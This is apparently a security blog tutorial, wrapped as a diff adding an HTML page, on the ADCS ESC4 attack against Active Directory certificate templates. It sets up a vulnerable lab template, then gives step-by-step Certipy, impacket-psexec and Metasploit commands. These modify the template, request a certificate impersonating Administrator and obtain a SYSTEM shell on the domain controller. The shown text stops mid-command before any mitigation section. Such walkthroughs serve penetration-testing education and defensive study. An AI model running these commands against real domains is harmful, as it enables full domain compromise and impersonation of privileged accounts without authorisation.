@@ -1,0 +1,274 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/active-directory-certificate-attack/" rel="category tag">Active Directory Certificate Attack</a></span>            </div>
+            <h1 class="post-title entry-title">ADCS ESC4: Vulnerable Certificate Template Access Control</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/adcs-esc4-vulnerable-certificate-template-access-control/" rel="bookmark"><time class="entry-date published" datetime="2025-05-10T18:07:03+00:00">May 10, 2025</time><time class="updated" datetime="2025-06-19T21:17:50+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;"><strong>ESC4 Active Directory Certificate Services Vulnerability</strong> is a high-risk vulnerability in <strong>Active Directory Certificate Services (ADCS)</strong> that enables attackers to exploit misconfigured certificate template permissions (e.g., Write, GenericAll, WriteDACL). This flaw serves as a critical entry point for a certificate attack. By modifying vulnerable templates, attackers can issue authentication certificates with Client or Server Authentication EKU, allowing them to impersonate privileged users or systems (e.g., Domain Admins, Domain Controllers) using <strong>Kerberos PKINIT</strong>.</span></p>
+<p><span style="color: #000000;">This form of <strong>ESC4 attack</strong> can lead to full <strong>domain compromise</strong>. Effective <strong>ADCS certificate attack</strong> mitigation requires strict permission control and hardened certificate template configurations.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Overview the ESC4 Attack</strong></span></li>
+<li><span style="color: #000000;"><strong>ESC4 Attack Mechanism</strong></span></li>
+<li><span style="color: #000000;"><strong>Server Authentication EKU Structure</strong></span></li>
+<li><span style="color: #000000;"><strong>Prerequisites</strong></span></li>
+<li><span style="color: #000000;"><strong>Lab Setup</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration and exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">ESC4 Attack Using Certipy</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Post Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Lateral Movement &amp; Privilege Escalation using impacket-psexec</span></li>
+<li><span style="color: #000000;">ESC4 Attack Using Metasploit</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Mitigation </strong></span></p>
+<h3><span style="color: #800000;">Overview the ESC4 Attack</span></h3>
+<p><span style="color: #000000;">The <strong>ESC4 attack</strong> in <strong>ADCS</strong> arises due to misconfigured <strong>Access Control Entries (ACEs)</strong> on certificate templates. When these ACEs grant unintended or unprivileged <strong>Active Directory users</strong> the ability to modify the <strong>security settings</strong> of a certificate template, attackers can gain control over the template, enabling them to issue certificates with elevated privileges. This attack is particularly dangerous when attackers can leverage certificates with the <strong>Server Authentication EKU</strong> (Extended Key Usage) to impersonate trusted servers, such as <strong>Domain Controllers</strong>, and gain unauthorized access to sensitive resources.</span></p>
+<p><span style="color: #000000;">The ESC4 attack becomes possible when the following conditions are met</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>True</strong> – Low-privileged user has <strong>Write/Owner/Modify</strong> permissions on a certificate template (e.g., WriteOwner, WriteDacl, WriteProperty).</span></li>
+<li><span style="color: #000000;"><strong>True</strong> – Low-privileged user has <strong>Enroll</strong> or <strong>Autoenroll</strong> permission on the vulnerable template.</span></li>
+<li><span style="color: #000000;"><strong>True</strong> – The template allows specifying a <strong>custom Subject Alternative Name (SAN)</strong> (e.g., to spoof a Domain Controller FQDN).</span></li>
+<li><span style="color: #000000;"><strong>True</strong> – The template includes or can be modified to include <strong>Server Authentication EKU</strong> (3.6.1.5.5.7.3.1).</span></li>
+</ul>
+<p><span style="color: #000000;"><strong><em>Note:</em></strong><em> This enables the certificate to be used for services like LDAPS, Kerberos PKINIT, or SMB.</em></span></p>
+<ul>
+<li><span style="color: #000000;"><strong>True</strong> – The CA does <strong>not require approval</strong> for certificate issuance (no manager or manual approval settings).</span></li>
+<li><span style="color: #000000;"><strong>True</strong> – Services like <strong>Kerberos (PKINIT)</strong>, <strong>LDAPS</strong>, or <strong>SMB</strong> <strong>trust certificates</strong> with Server Authentication EKU.</span></li>
+<li><span style="color: #000000;"><strong>True</strong> – The attacker can request a certificate with <strong>arbitrary SAN entries</strong>, such as a Domain Controller’s name.</span></li>
+</ul>
+<p><span style="color: #000000;"><strong><em>Note:</em></strong><em> ESC4 attacks can also succeed due to oversight—especially when there is no auditing or alerting in place for certificate template modifications or suspicious certificate requests.</em></span></p>
+<h3><span style="color: #800000;">ESC4 Attack Mechanism</span></h3>
+<p><span style="color: #000000;">The ESC4 attack begins with misconfigured certificate templates in ADCS, where attackers with Write or Full Control can issue Server Authentication EKU certificates. These trusted certificates let attackers impersonate critical servers like Domain Controllers, enabling privilege escalation, unauthorized access, and full domain compromise.</span></p>
+<h5><span style="color: #000000;"><strong>Attack Flow:</strong></span></h5>
+<ul>
+<li><span style="color: #000000;"><strong>Identify Vulnerable Templates</strong>: Attacker finds certificate templates with misconfigured permissions (e.g., Write, Full Control).</span></li>
+<li><span style="color: #000000;"><strong>Modify Template</strong>: Attacker adds Server Authentication EKU to enable certificate-based impersonation.</span></li>
+<li><span style="color: #000000;"><strong>Request Certificate</strong>: Using tools like Certipy-AD, attacker requests a certificate from the modified template.</span></li>
+<li><span style="color: #000000;"><strong>Inspect/reissue of certificate</strong><strong>:</strong> Confirm the abuse path and generate an updated certificate if modified.</span></li>
+<li><span style="color: #000000;"><strong>Use Certificate</strong>: The attacker authenticates as a trusted server (e.g., Domain Controller) using the issued certificate.</span></li>
+<li><span style="color: #000000;"><strong>Compromise Domain</strong>: Attacker escalates privileges, gaining Domain Admin rights and full control over the domain.</span></li>
+</ul>
+<h3><span style="color: #800000;">Server Authentication EKU Structure</span></h3>
+<p><span style="color: #000000;"><strong>EKU (Extended Key Usage)</strong> is a field within an X.509 certificate that defines the intended usage of the certificate. <strong>Server Authentication EKU</strong> is used in certificates that are issued for the purpose of authenticating servers in a secure communication channel. It is typically used for <strong>SSL/TLS certificates</strong> and <strong>Kerberos</strong> authentication for services like <strong>Domain Controllers</strong>.</span></p>
+<h5><span style="color: #000000;"><strong>Server Authentication EKU Structure:</strong></span></h5>
+<ul>
+<li><span style="color: #000000;"><strong>OID (Object Identifier)</strong>: 1.3.6.1.5.5.7.3.1: defines the certificate for <strong>server authentication</strong> (SSL/TLS or Kerberos).</span></li>
+<li><span style="color: #000000;"><strong>Subject Alternative Name (SAN)</strong>: Contains DNS names or IPs, enabling server impersonation if modified.</span></li>
+<li><span style="color: #000000;"><strong>Key Usage</strong>: Specifies cryptographic functions, allowing the certificate for <strong>SSL/TLS</strong> or <strong>Kerberos</strong> authentication.</span></li>
+<li><span style="color: #000000;"><strong>EKU (Extended Key Usage)</strong>: Defines the certificate’s usage, where attackers can add <strong>Server Authentication EKU</strong> to impersonate trusted servers.</span></li>
+</ul>
+<h4><span style="color: #800000;">Prerequisite </span></h4>
+<ul>
+<li><span style="color: #000000;">Windows Server 2019 as Active Directory that supports PKINIT</span></li>
+<li><span style="color: #000000;">Domain must have Active Directory Certificate Services and Certificate Authority configured.</span></li>
+<li><span style="color: #000000;">Kali Linux packed with tools</span></li>
+<li><span style="color: #000000;">Tools: Impacket-psexec, certipy-ad, Metasploit</span></li>
+</ul>
+<h3><span style="color: #800000;">Lab setup</span></h3>
+<p><span style="color: #000000;">Starting by launching the Certificate Template Console:</span></p>
+<p><span style="color: #000000;">Run certtmpl.msc on the Domain Controller, then navigate to <strong>Certificate Templates → Manage</strong>.</span></p>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhLwSmphnK-eWjR0Z-ivVOTiyPyFVHrI_0vF8R6s6pk6vkjXC2AgasCnhF79Qgb6aKfQSft7_xEdc8zhzc2JhezxWjAMUFTsNucCRmSCBcz31F7KrFEtLnhq-3_iidPWjkdVyySKbCxpLFRVfBtUy7FNr6YeuPn_oUmMNwIIlsqgqb_VpEQ9RCU6fSLd0Ls/s16000/1.png" alt="ADCS ESC4 - Vulnerable Certificate Template Access Control" width="710" height="462"/></span></p>
+<p><span style="color: #000000;">Duplicate the “Certificate Template” Template</span></p>
+<ul>
+<li><span style="color: #000000;">Scroll down and find the <strong>“Code Signing”</strong> template.</span></li>
+<li><span style="color: #000000;">Right-click it → Click <strong>Duplicate Template</strong>.</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiXMv0L6Z0bqsKNJnYM6m7ArkXw7SbHUBi3Nbcp746cl6OpFNevcsnLUcOnOlMWQfAHhZ69jYuz0yhlctvzb52FY3CsZrOjx8aZt70shVo0J8X2GuzAZi9Jzf8ii26HgbQ5Btak-U0Nfjp2f1qALfxbK6UxMul4zCiHClhGVdZOwCaPY9fklHtyRbduTvuI/s16000/2.png"/></span></p>
+<h4><span style="color: #000000;">Configure the New Template</span></h4>
+<p><span style="color: #000000;">A new window will appear with multiple tabs, go through them one by one.</span></p>
+<p><span style="color: #000000;">General Tab:</span></p>
+<ul>
+<li><span style="color: #000000;">Set the <strong>Template display name</strong> to: ESC4</span></li>
+<li><span style="color: #000000;">(Optional) Adjust the <strong>Validity Period</strong> — the default of 1 year is typically sufficient.</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqJSDiiEx4XqILvTJxaMtboiF3SUtF7U00C2u-qyQlnpEtPoAMp23wBv3n4OgaUZxNdAnAu_NMNHlTABs-tRdfGXrygHAjW1nsgld6r1yef6ngybXRj5S5671DWsHXlME64OoK_efTwNg6e7Kq0T_7HOl44A1vwSODUHokH8Vb9Ci9E21ynsPhp9HDYMBF/s16000/3.png"/></span></p>
+<p><span style="color: #000000;"><em>This name will show up when requesting the certificate</em></span></p>
+<h4><span style="color: #000000;">Configure the Subject Name Tab:</span></h4>
+<ul>
+<li><span style="color: #000000;">Select: <strong>Build from this Active Directory information</strong></span></li>
+<li><span style="color: #000000;">Select:<strong> Subject Name Format to None</strong></span></li>
+<li><span style="color: #000000;">Check:<strong> User Principal name (UPN)</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><strong><em>Note: </em></strong><em>Setting this to None uses the default Active Directory information for the subject name without any additional formatting or customization.</em></span></p>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi4otFkYQAqV96IfbuuGawiuSFT7Dx0ZtGmldiswtDltjvlMWvH4kFRxWHzvxU5-o78SBbpDkRmaYYZta5Kn1K5Ra1WUQ3YkKmw94FemwWWdplV_yacoOf105ug7cHHNdR6y4ui_CoV6i5t7PMxwKvHMpidahfVy5DtEHkxEXPbgtvw87jgG71jLKdOGWFN/s16000/4.png" alt="ADCS ESC4 - Vulnerable Certificate Template Access Control" width="494" height="689"/></span></p>
+<h4><span style="color: #000000;">Configure the Security Tab</span></h4>
+<ul>
+<li><span style="color: #000000;">Click <strong>Add</strong> → Type Domain Users → Click OK</span></li>
+<li><span style="color: #000000;">Select Domain Users</span></li>
+<li><span style="color: #000000;">Check →  Write</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgmWh0as8ToUOrWNi1w6ECJFiJxjkmOtjpd7iAqXn5CvSDWKQZ58-nLUyExMm4kHAR6MwIHzV6LOZe-AskUtFPuBfDF7qbQA72hBCdyEcRzTwwKBKHa5AHnb0_EGqLWyhyKSBVgw47UmOh7IDEPShqa9RDXAI0Hq2BF2dDXGnWy1PVcauFzvrzcV78N3m9d/s16000/5.png"/></span></p>
+<h4><span style="color: #000000;">Configure the Extensions Tab</span></h4>
+<ul>
+<li><span style="color: #000000;">Go to the <strong>Extensions</strong> tab</span></li>
+<li><span style="color: #000000;">Select <strong>Application Policies</strong> → Click <strong>Edit</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBgAwHMJ0dlzong0SsWnkyv7ScDrcZiACWDaZBx8UujBjRDNnsxxvjf-Q-39l7NUnKO3dtW9fZHOU13FiWUyI_9USpM6NTrZqdvv6KQ4llottsiPEMOeHuLGPFzlM2DXTv7kxLZcfhdsTwWrjaLAixz1uaBqVVL0axhDr0Q0_STMlkFwnpmp97wW9QEDLY/s16000/6.png" alt="ADCS ESC4 - Vulnerable Certificate Template Access Control" width="496" height="695"/></span></p>
+<h5><strong><span style="color: #000000;">Inside the Edit Window:</span></strong></h5>
+<ul>
+<li><span style="color: #000000;">Click <strong>Add</strong><strong> and then </strong>Select <strong>Server Authentication</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhm53qRM3xNLN-qB7V_mxgA74oR5MogpeDlN5jdIguphTewaOE4RvOOoraxPE3jNVVQ0F3F-sSKgtGWZmxfilzZwcJfpqZ3hwDOBzIIa6xFbZ_4UZnXaGG3b9WuvshOWDdWfDt95qvlu_QV81249Dr9Ci_AKqPOjLCgkVzMMpTNIUa9LCvvwulfTO0khLlr/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">And Click <strong>OK</strong></span></p>
+<h4><span style="color: #000000;">Confirm Issuance Requirements</span></h4>
+<p><span style="color: #000000;">Go back to the Certificate Authority (certsrv.msc) window. Right-click Certificate Templates → Click New → Certificate Template to Issue.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxrOG0ozn-055vlMwitNutlFCn3tZpxiK7WojahxEbYoXnIDGsySsafidOH3F2r5wMcUf-cS35IhEitBwtapohNvPBe6jKUG4ayVTEgW134MYuzW8EdAwcH6_E5GuExw1SXpkAzz0m8yiv6Gf25s3AFEv_eWiMYn7qLAWpzgR7oRjWVPiMy45kpHhw8csC/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">Find Vulnerable Template in the list and select it, in our case we created it as ESC4.</span></p>
+<p><span style="color: #000000;">Click OK to publish it</span></p>
+<h4><span style="color: #000000;">Save the Template</span></h4>
+<ul>
+<li><span style="color: #000000;">Click <strong>OK</strong> to save and close</span></li>
+</ul>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhq5YTxxfZWu2Q9bhYG2O4HWKCxkjNKCD_HadFZvg3eK703D4PshYbxjssZsgOzQrVNn7_Y9ULIInCANr_iZwvfvc_T1FA9BDx3cSflUiFP5-qRzpiz1OZZdw1eeq8Fpn2rSa5hfYKalb6W6vkBKzyLNBAig0763aGUboWivJjNe_fCWmIpc5RrNKtxK8Ra/s16000/9.png" alt="ADCS ESC4 - Vulnerable Certificate Template Access Control" width="726" height="461"/></span></p>
+<p><span style="color: #000000;">We can see our <strong>template</strong> is now created!</span></p>
+<h3><span style="color: #800000;">Enumeration &amp; Exploitation</span></h3>
+<h4><span style="color: #000000;">ESC4 Attack Using Certipy</span></h4>
+<p><span style="color: #000000;">Use Certipy from the attacker machine to enumerate the ADCS configuration and identify vulnerable templates, specifying ‘raj’ as the user. The command to run is:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad find -u 'raj@ignite.local' -p Password@1 -dc-ip 192.168.1.48 -vulnerable -enabled</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhIcyQhdB1CastZkL-01sXCAgicEVOa8NjztWzgT_03f5U7Dx1rE3u8-Ux2SaY0lgv6xnBelGSUDEk9cI4S_W5bUY8r9ikt654D7Pr7C7SKNzwe2YnwsWAt-Rsl83GX6k322uPZKc3rnAFwTSsr1rz6HK6do-BWkzFKrqsxUItiIXLjlopi0lO-P3rueLsB/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">Open 20250402135640_Certipy.txt or .json and find a vulnerable template and CA with dangerous permissions for Domain Users. A vulnerable template, ESC4, was identified, with key risk indicators including write permissions assigned to Domain Users and the template being both enabled and accessible</span></p>
+<p><span style="color: #000000;">The template can be modified or exploited through chaining attacks using Certipy-AD. We’ll take advantage of this by enabling specific flags that facilitate additional attack paths. Leveraging the permissions on ESC4, we will update the template to enable full exploitation.</span></p>
+<p><span style="color: #000000;">This command applies a <strong>custom configuration</strong> to an existing AD CS certificate template using certipy-ad</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad template -u 'raj@ignite.local' -p Password@1 -template ESC4 -target 192.168.1.48 -save-old</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnY3F6wPTSQ6YL08_S16aaVIa9xLqohN1-_QY1l7-madLVVMRjCV127xscGNvhwiUXHhkrRYUZosqy2WKc2Z-Rp56XoC54vunfAa-MrBelC7JGcoMSSHftyWjBLFDqBBG_wWc3pmHDz2ykGKvKbgrbEGmJUlEetUMbJxa04JtNOx2qSWqhZFe1RijyiopK/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">This modified the <strong>ESC4</strong> certificate template — likely to <strong>make it even more abusable</strong>, especially for <strong>ESC1 style abuse</strong>, not just ESC4.</span></p>
+<p><span style="color: #000000;">Further details on ESC1 can be found here <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/ad-certificate-exploitation-esc1/">AD Certificate Exploitation: ESC1</a></span></strong></span></p>
+<p><span style="color: #000000;">Inspecting the vulnerable template using the command</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad find -u 'raj@ignite.local' -p Password@1 -dc-ip 192.168.1.48 -vulnerable -enabled</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjhX0dvGB24mG-2-IC9srmqxOfyb0_prHsKzEn3dqiIYgPFeeRzkEhuMFVnYkTzskpUoXwtdB42ndeqBT3cX-bdVCX5_Vo4UKMFzJpyNH1K2LkGeKsHqibenKOqMKQ0SKaY7aTCzQ0LOO1fTIV2TBZC3o7OZrZTxqWsJXfv7B_B05F9X7-8RjVu7h94BdUR/s16000/17.png" alt="ADCS ESC4 - Vulnerable Certificate Template Access Control" width="1031" height="413"/></span></p>
+<h5><strong><span style="color: #000000;">After reading the template, the following changes are evident:</span></strong></h5>
+<ul>
+<li><span style="color: #000000;"><em>Client Authentication</em> is set to <em><strong>True</strong></em>, enabling the certificate for logon/PKINIT, which is essential for Kerberos authentication abuse.</span></li>
+<li><span style="color: #000000;">The <em>Enrollment Agent</em> flag is also <strong>enabled</strong>, a dangerous setting that allows issuing certificates on behalf of others.</span></li>
+<li><span style="color: #000000;"><em>Any Purpose</em> flag is <strong>activated</strong>, permitting the certificate to be used for any Enhanced Key Usage (EKU).</span></li>
+<li><span style="color: #000000;"><em>Enrollee Supplies Subject</em> <strong>enabled</strong>, an attacker can specify their own UPN or username when requesting the certificate</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8MrdPESvPeei9ShO03NMpRWJDOkqj_P0Ir8FTvidYGC7EB9oxAs1n6hEalGwnIxhY8Z8zgXTpnxP4ugJ-lmYl-FsjxynpoXpVcdnRyUvgVGA0pTjkB9nDr0lWjQkBiPRYnH-O3Kzwglo4AeI6DjL38SLDj-phW_o48oNbiotzEpzNbhgIbW7zQ1RCyetp/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">These changes allow direct certificate requests for <em>any</em> domain user like classic ESC1 abuse.</span></p>
+<p><span style="color: #000000;"><em>Note: The most critical misconfiguration occurred when a user was granted write permissions over a certificate template. In the case of ESC4, this allows the user to modify the template to enable additional, easily exploitable features.</em></span></p>
+<h5><strong><span style="color: #000000;">Why It’s So Powerful (Post-Modification)</span></strong></h5>
+<p><span style="color: #000000;">We transformed the ESC4 template, which initially required an NTLM relay, into a more versatile vulnerability that allows direct abuse through various ADCS attack paths without the need for an NTLM relay</span></p>
+<p><span style="color: #000000;">We now impersonate Administrator and request a certificate:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad req -u 'raj@ignite.local' -p 'Password@1' -dc-ip 192.168.1.48  -ca ignite-DC-CA -target 'dc.ignite.local' -template 'ESC4' -upn 'administrator@ignite.local'</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhd6SByPm76-ZjpKYqmkP_yzV8D7FEXFX0mciZTiWRx0kDBsTDTNT6ebQfTI18te7xuHcZoQrgUINiW96xpa5MweOXxYkguVtmYJKSStWfsEAgEwY_pq1rMcaNdmvChvznTwspPu-v4CG5PzR2jyt6VoNFbAn4nzczgeEZwBI5Riom_dxkkxu5EsVfrYCTJ/s16000/19.png" alt="ADCS ESC4 - Vulnerable Certificate Template Access Control" width="993" height="308"/></span></p>
+<p><span style="color: #000000;">Certipy saves a .pfx file (administrator.pfx) with full impersonation credentials so lets authenticate as Administrator using the certificate</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad auth -pfx administrator.pfx  -dc-ip 192.168.1.48</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrduJa1HoHsx5rt6q9lmxWhkBa_90ZUiTI3xGRCNn_v9sdXs0wTVkwXwA0gbBMhDacBKX4g3DuJkLavykWCsmz0Wvs9pmr-J-Mqis-_yTwi1WBhITa7B64XZqdm546D0xHRhjXmqC4kgApeGuXMV-6Ydd7hytWzf4fnulU5rpI9SOxnR1U__pSGuLTT5HI/s16000/20.png"/></span></p>
+<h3><span style="color: #800000;">Post Exploitation</span></h3>
+<h4><span style="color: #000000;">Lateral Movement &amp; Privilege Escalation using impacket-psexec</span></h4>
+<p><span style="color: #000000;">This grants a <strong>Kerberos TGT</strong> for the Administrator account. With the ticket active, we can execute commands as Administrator on the DC:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-psexec ignite.local/administrator@ignite.local -hashes &lt;Hash Value&gt;</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgW7EqQuNF23QXnQ4aCauyKUH78KnKjQDgYFjGf-IjJUo-5BHGZha2niqHhEUG8x75yoFARQQ58LZ31VhEooUfQbn5ZFUJNzZvgD7JRB9V6qUd8s1m9Ob8Wvsr-frpt_yK3t8RrocRWWmgHBV-DuzrYdjCZukSoPOXWB1nu0nxT_lOUfqK5_JdBdHKLA0T0/s16000/21.png"/></p>
+<p><span style="color: #000000;">We successfully obtained a SYSTEM shell on the Domain Controller, full domain compromise confirmed.</span></p>
+<h4><span style="color: #000000;">ESC4 Attack using Metasploit</span></h4>
+<h5><strong><span style="color: #000000;">Identify Vulnerable Certificate Templates</span></strong></h5>
+<p><span style="color: #000000;">Use Metasploit’s ldap_esc_vulnerable_cert_finder module to enumerate certificate templates susceptible to ESC vulnerabilities. Learn more about the module <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://rapid7.github.io/metasploit-framework/docs/pentesting/active-directory/ad-certificates/ldap_esc_vulnerable_cert_finder.html">here</a></span></strong></span></p>
+<p><span style="color: #000000;"><em>Note: This module queries the LDAP server to identify certificate templates vulnerable to various ESC attacks, including ESC1, ESC2, ESC3 and ESC4</em></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/gather/ldap_esc_vulnerable_cert_finder
+set DOMAIN ignite.local
+set USERNAME raj
+set PASSWORD Password@1
+set RHOSTS 192.168.1.48
+run</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjjQE2FTpMFG-LIsZx2gsp22HAMvHQt5zUt3PC31GqZ8P7m0_s8VY4tI24VCyLvn3v-SgsbZphDnaGDlz4Rz3AbCo8ZB5O6r4fAoWcS2BjI4L0YjXQRMAqPqqkqdhWoKD0VjNbJY9-xM7lXZdXfNi6Hh1V4RK3z2387_NJ1gQv18MrHhKuc73MeMFj6CjUH/s16000/22.png" alt="ADCS ESC4 - Vulnerable Certificate Template Access Control" width="841" height="706"/></span></p>
+<h5><strong><span style="color: #000000;">Modify the Vulnerable Template</span></strong></h5>
+<p><span style="color: #000000;">When the ESC4 template is identified as vulnerable, use Certipy to modify its configuration</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad template -u 'raj@ignite.local' -p Password@1 -template ESC4 -target 192.168.1.48 -configuration ESC4.json</pre>
+<p><span style="color: #000000;"> This command applies the settings defined in Custom_Template_ESC4.json to the ESC4 template, potentially enabling flags like Client Authentication, Enrollment Agent, Any Purpose, and allowing the enrollee to supply the subject.</span></p>
+<h5><strong><span style="color: #000000;">Request a Certificate for Administrator</span></strong></h5>
+<p><span style="color: #000000;">With the modified template, request a certificate impersonating the Administrator account:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/dcerpc/icpr_cert
+set RHOSTS 192.168.1.48
+set CA ignite-DC-CA
+set CERT_TEMPLATE ESC4
+set SMBDomain ignite.local
+set SMBPass Password@1
+set SMBUser raj
+set alt_upn administrator
+run</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3wm_3H2g-E6Ag6tdHrOI2Bs0ZlWqkNjFKcw_AwbvFbSf0a_352zyE9IgmMWYknkQgIkBvf75VLne4xrb-Kigx_HEZWR0DcFzZWSMvNkijxnh3Sm9xfiZTTZo8yVjLqMx0mQugCoGQcGTSrWMRky22Expot9skBY83gfLFKCjW69KGHqiMwKwmxaG57SM1/s16000/24.png" alt="ADCS ESC4 - Vulnerable Certificate Template Access Control" width="828" height="492"/></span></p>
+<p><span style="color: #000000;">This module exploits the misconfiguration to issue a certificate for a different User Principal Name (UPN), effectively allowing authentication as another user. Read more <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://rapid7.github.io/metasploit-framework/docs/pentesting/active-directory/ad-certificates/icpr_cert.html">here</a></span></strong></span></p>
+<h5><strong><span style="color: #000000;">Inspect Modified Template</span></strong></h5>
+<p><span style="color: #000000;">This is helpful to <strong>validate that the template is still misconfigured</strong> or document what is changed for this fire the Metasploit module auxiliary/admin/ldap/ad_cs_cert_template. Learn more about this module <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://rapid7.github.io/metasploit-framework/docs/pentesting/active-directory/ad-certificates/ad_cs_cert_template.html">here</a>.</span></strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/ldap/ad_cs_cert_template
+set RHOSTS 192.168.1.48
+set USERNAME raj
+set domain ignite.local
+set PASSWORD Password@1
+set CERT_TEMPLATE ESC4
+set ACTION UPDATE
+set VERBOSE true
+run</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgntkAF3M0WVhIuqu6c0TFG9odO85UgW3cdS9RMN3fx48NMmw39Dar-YbbXnTPsrnVfaQ6hdUaeVWYfoFPJXfEOwRBc94D9g1QcV3mfFQoE979QCfDH7Hice7UUTmPCO9GkN1PG5USLV02A0Svv2HxqYUesJI6P0panf5mH5AjjFCraqQf0758-5wOb_10b/s16000/25.png"/></span></p>
+<p><span style="color: #000000;">This retrieves detailed information about the ESC4 certificate template, including EKUs (e.g., Client Authentication), Enrollment Agent flag, subject name settings, authorized enrollers, and validity/renewal period, just as we did above using Certipy.</span></p>
+<h5><strong><span style="color: #000000;">Re-Issue Certificate</span></strong></h5>
+<p><span style="color: #000000;">Run the icpr_cert module again to verify abuse path consistency:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/dcerpc/icpr_cert
+set RHOSTS 192.168.1.48
+set CA ignite-DC-CA
+set CERT_TEMPLATE ESC4
+set SMBDomain ignite.local
